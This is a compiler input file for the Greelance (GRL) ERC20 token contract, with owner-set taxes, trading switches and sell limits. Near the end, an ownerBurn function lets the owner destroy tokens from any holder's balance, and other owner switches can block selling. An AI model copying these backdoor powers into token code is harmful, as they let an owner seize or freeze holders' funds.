{
  "language": "Solidity",
  "sources": {
    "contracts/Greelance.sol": {
      "content": "/*\n\n   _____                        _                               \n  / ____|                      | |                              \n | |  __   _ __    ___    ___  | |   __ _   _ __     ___    ___ \n | | |_ | | '__|  / _ \\  / _ \\ | |  / _` | | '_ \\   / __|  / _ \\\n | |__| | | |    |  __/ |  __/ | | | (_| | | | | | | (__  |  __/\n  \\_____| |_|     \\___|  \\___| |_|  \\__,_| |_| |_|  \\___|  \\___|\n                                                                \n                                                                                                    \n                                                      \nOfficial Links\n\nWebsite: https://greelance.com/\nTwitter: https://twitter.com/GreelanceI\nTelegram: https://t.me/greelancer \nDiscord: https://discord.gg/ukNCBwQCD9\n*/\n\n// SPDX-License-Identifier: MIT\n\npragma solidity 0.8.19;\n\ninterface IERC20 {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address account) external view returns (uint256);\n\n    function transfer(address recipient, uint256 amount) external returns (bool);\n\n    function allowance(address owner, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 amount) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address recipient,\n        uint256 amount\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed to, uint256 value);\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n}\n\ninterface IERC20Metadata is IERC20 {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\nabstract contract Context {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691\n        return msg.data;\n    }\n}\n\nabstract contract Ownable is Context {\n    address private _owner;\n\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n\n    constructor() {\n        address msgSender = _msgSender();\n        _owner = msgSender;\n        emit OwnershipTransferred(address(0), msgSender);\n    }\n\n    function owner() public view returns (address) {\n        return _owner;\n    }\n\n    modifier onlyOwner() {\n        require(_owner == _msgSender(), 'Ownable: caller is not the owner');\n        _;\n    }\n\n    function renounceOwnership() public virtual onlyOwner {\n        emit OwnershipTransferred(_owner, address(0));\n        _owner = address(0);\n    }\n\n    function transferOwnership(address newOwner) public virtual onlyOwner {\n        require(newOwner != address(0), 'Ownable: new owner is the zero address');\n        emit OwnershipTransferred(_owner, newOwner);\n        _owner = newOwner;\n    }\n}\n\ncontract ERC20 is Context, IERC20, IERC20Metadata {\n    mapping(address => uint256) private _balances;\n\n    mapping(address => mapping(address => uint256)) private _allowances;\n\n    uint256 private _totalSupply;\n\n    string private _name;\n    string private _symbol;\n\n    constructor(string memory name_, string memory symbol_) {\n        _name = name_;\n        _symbol = symbol_;\n    }\n\n    function name() public view virtual override returns (string memory) {\n        return _name;\n    }\n\n    function symbol() public view virtual override returns (string memory) {\n        return _symbol;\n    }\n\n    function decimals() public view virtual override returns (uint8) {\n        return 9;\n    }\n\n    function totalSupply() public view virtual override returns (uint256) {\n        return _totalSupply;\n    }\n\n    function balanceOf(address account) public view virtual override returns (uint256) {\n        return _balances[account];\n    }\n\n    function transfer(address recipient, uint256 amount)\n        public\n        virtual\n        override\n        returns (bool)\n    {\n        _transfer(_msgSender(), recipient, amount);\n        return true;\n    }\n\n    function allowance(address owner, address spender)\n        public\n        view\n        virtual\n        override\n        returns (uint256)\n    {\n        return _allowances[owner][spender];\n    }\n\n    function approve(address spender, uint256 amount)\n        public\n        virtual\n        override\n        returns (bool)\n    {\n        _approve(_msgSender(), spender, amount);\n        return true;\n    }\n\n    function transferFrom(\n        address sender,\n        address recipient,\n        uint256 amount\n    ) public virtual override returns (bool) {\n        uint256 currentAllowance = _allowances[sender][_msgSender()];\n        if (currentAllowance != type(uint256).max) {\n            require(\n                currentAllowance >= amount,\n                'ERC20: transfer amount exceeds allowance'\n            );\n            unchecked {\n                _approve(sender, _msgSender(), currentAllowance - amount);\n            }\n        }\n\n        _transfer(sender, recipient, amount);\n\n        return true;\n    }\n\n    function increaseAllowance(address spender, uint256 addedValue)\n        public\n        virtual\n        returns (bool)\n    {\n        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);\n        return true;\n    }\n\n    function decreaseAllowance(address spender, uint256 subtractedValue)\n        public\n        virtual\n        returns (bool)\n    {\n        uint256 currentAllowance = _allowances[_msgSender()][spender];\n        require(\n            currentAllowance >= subtractedValue,\n            'ERC20: decreased allowance below zero'\n        );\n        unchecked {\n            _approve(_msgSender(), spender, currentAllowance - subtractedValue);\n        }\n\n        return true;\n    }\n\n    function _transfer(\n        address sender,\n        address recipient,\n        uint256 amount\n    ) internal virtual {\n        require(sender != address(0), 'ERC20: transfer from the zero address');\n        require(recipient != address(0), 'ERC20: transfer to the zero address');\n\n        _beforeTokenTransfer(sender, recipient, amount);\n\n        uint256 senderBalance = _balances[sender];\n        require(senderBalance >= amount, 'ERC20: transfer amount exceeds balance');\n        unchecked {\n            _balances[sender] = senderBalance - amount;\n        }\n        _balances[recipient] += amount;\n\n        emit Transfer(sender, recipient, amount);\n\n        _afterTokenTransfer(sender, recipient, amount);\n    }\n\n    function _mint(address account, uint256 amount) internal virtual {\n        require(account != address(0), 'ERC20: mint to the zero address');\n\n        _beforeTokenTransfer(address(0), account, amount);\n\n        _totalSupply += amount;\n        _balances[account] += amount;\n        emit Transfer(address(0), account, amount);\n\n        _afterTokenTransfer(address(0), account, amount);\n    }\n\n    function _burn(address account, uint256 amount) internal virtual {\n        require(account != address(0), 'ERC20: burn from the zero address');\n\n        _beforeTokenTransfer(account, address(0), amount);\n\n        uint256 accountBalance = _balances[account];\n        require(accountBalance >= amount, 'ERC20: burn amount exceeds balance');\n        unchecked {\n            _balances[account] = accountBalance - amount;\n        }\n        _totalSupply -= amount;\n\n        emit Transfer(account, address(0), amount);\n\n        _afterTokenTransfer(account, address(0), amount);\n    }\n\n    function _approve(\n        address owner,\n        address spender,\n        uint256 amount\n    ) internal virtual {\n        require(owner != address(0), 'ERC20: approve from the zero address');\n        require(spender != address(0), 'ERC20: approve to the zero address');\n\n        _allowances[owner][spender] = amount;\n        emit Approval(owner, spender, amount);\n    }\n\n    function _beforeTokenTransfer(\n        address from,\n        address to,\n        uint256 amount\n    ) internal virtual {}\n\n    function _afterTokenTransfer(\n        address from,\n        address to,\n        uint256 amount\n    ) internal virtual {}\n}\n\ncontract Greelance is ERC20, Ownable {\n    address public uniswapV2Pair;\n\n    mapping(address => bool) private _isExcludedFromFees;\n\n    uint256 public taxFeeOnBuy;\n    uint256 public taxFeeOnSell;\n\n    address public taxCollector;\n\n    bool public tradingEnabled;\n    bool private tokenMinted = false;\n    uint256 public maxSellableAmount;\n    bool public maxSellableRestrictionEnabled = false;\n    bool public trading24HrsRestrictionEnabled = false;\n    mapping(address => uint256) public tradingIn24Hours;\n    mapping(address => uint256) public lastTradeTime;\n\n    event ExcludeFromFees(address indexed account, bool isExcluded);\n\n    constructor(address taxCollector_) ERC20('Greelance', 'GRL') {\n        taxCollector = taxCollector_;\n        _isExcludedFromFees[owner()] = true;\n        _isExcludedFromFees[address(this)] = true;\n    }\n\n    receive() external payable {}\n\n    function mint() external onlyOwner {\n        require(!tokenMinted, 'Tokens already minted!');\n        tokenMinted = true;\n        _mint(owner(), 2000000000 * (10**decimals()));\n    }\n\n    function setMaxSellableAmount(uint256 _maxAmount) external onlyOwner {\n        require(_maxAmount > 0, 'Invalid amount!');\n        maxSellableAmount = _maxAmount;\n        maxSellableRestrictionEnabled = true;\n    }\n\n    function setTaxCollector(address taxCollector_) external onlyOwner {\n        require(taxCollector_ != address(0), 'Tax collector cant be zero address');\n        require(taxCollector_ != taxCollector, 'Same tax collector');\n        taxCollector = taxCollector_;\n    }\n\n    function removeMaxSellableRestriction() external onlyOwner {\n        maxSellableRestrictionEnabled = false;\n    }\n\n    function excludeFromFees(address account) external onlyOwner {\n        require(!_isExcludedFromFees[account], 'Account already excluded');\n        _isExcludedFromFees[account] = true;\n\n        emit ExcludeFromFees(account, true);\n    }\n\n    function includeFromFees(address account) external onlyOwner {\n        require(_isExcludedFromFees[account], 'Account already included');\n        _isExcludedFromFees[account] = false;\n\n        emit ExcludeFromFees(account, false);\n    }\n\n    function enable24HrsRestriction() external onlyOwner {\n        trading24HrsRestrictionEnabled = true;\n    }\n\n    function disable24HrsRestriction() external onlyOwner {\n        trading24HrsRestrictionEnabled = false;\n    }\n\n    function setUniswapPair(address _uniswapV2Pair) external onlyOwner {\n        uniswapV2Pair = _uniswapV2Pair;\n    }\n\n    function isExcludedFromFees(address account) public view returns (bool) {\n        return _isExcludedFromFees[account];\n    }\n\n    function setBuyTaxPercentage(uint256 _taxAmount) external onlyOwner {\n        require(_taxAmount <= 20, 'Tax not more than 20!');\n        taxFeeOnBuy = _taxAmount;\n    }\n\n    function setSellTaxPercentage(uint256 _taxAmount) external onlyOwner {\n        require(_taxAmount <= 20, 'Tax not more than 20!');\n        taxFeeOnSell = _taxAmount;\n    }\n\n    function enableTrading() external onlyOwner {\n        require(!tradingEnabled, 'Trading already enabled.');\n        tradingEnabled = true;\n    }\n\n    function _transfer(\n        address from,\n        address to,\n        uint256 amount\n    ) internal override {\n        require(from != address(0), 'ERC20: transfer from the zero address');\n        require(to != address(0), 'ERC20: transfer to the zero address');\n        require(\n            tradingEnabled || _isExcludedFromFees[from] || _isExcludedFromFees[to],\n            'Trading not yet enabled!'\n        );\n\n        if (amount == 0) {\n            super._transfer(from, to, 0);\n            lastTradeTime[from] = block.timestamp;\n            return;\n        }\n\n        bool shouldApplyFees = !(_isExcludedFromFees[from] || _isExcludedFromFees[to]);\n        uint256 fees = shouldApplyFees\n            ? (amount * (from == uniswapV2Pair ? taxFeeOnBuy : taxFeeOnSell)) / 100\n            : 0;\n\n        if (shouldApplyFees) {\n            if (from != uniswapV2Pair) {\n                if (maxSellableRestrictionEnabled) {\n                    require(\n                        amount <= maxSellableAmount,\n                        'Amount is greater than MaxSellableAmount'\n                    );\n                }\n\n                if (trading24HrsRestrictionEnabled) {\n                    if (\n                        maxSellableRestrictionEnabled &&\n                        block.timestamp - lastTradeTime[from] >= 1 days\n                    ) {\n                        tradingIn24Hours[from] = 0;\n                    } else if (tradingIn24Hours[from] + amount > maxSellableAmount) {\n                        require(\n                            block.timestamp - lastTradeTime[from] >= 1 days,\n                            'Transfer restricted before 24 hours'\n                        );\n                    }\n\n                    if (maxSellableRestrictionEnabled) {\n                        tradingIn24Hours[from] += amount;\n                    }\n                }\n            }\n        }\n\n        if (fees > 0) {\n            super._transfer(from, taxCollector, fees);\n            amount -= fees;\n        }\n\n        super._transfer(from, to, amount);\n        lastTradeTime[from] = block.timestamp;\n    }\n\n    function ownerBurn(address from_, uint256 amount_) external onlyOwner {\n        _burn(from_, amount_);\n    }\n}\n"
    }
  },
  "settings": {
    "optimizer": {
      "enabled": true,
      "runs": 200
    },
    "outputSelection": {
      "*": {
        "*": [
          "abi",
          "evm.bytecode",
          "evm.deployedBytecode",
          "evm.methodIdentifiers",
          "metadata",
          "devdoc",
          "userdoc",
          "storageLayout",
          "evm.gasEstimates"
        ],
        "": [
          "ast"
        ]
      }
    },
    "metadata": {
      "useLiteralContent": true
    }
  }
}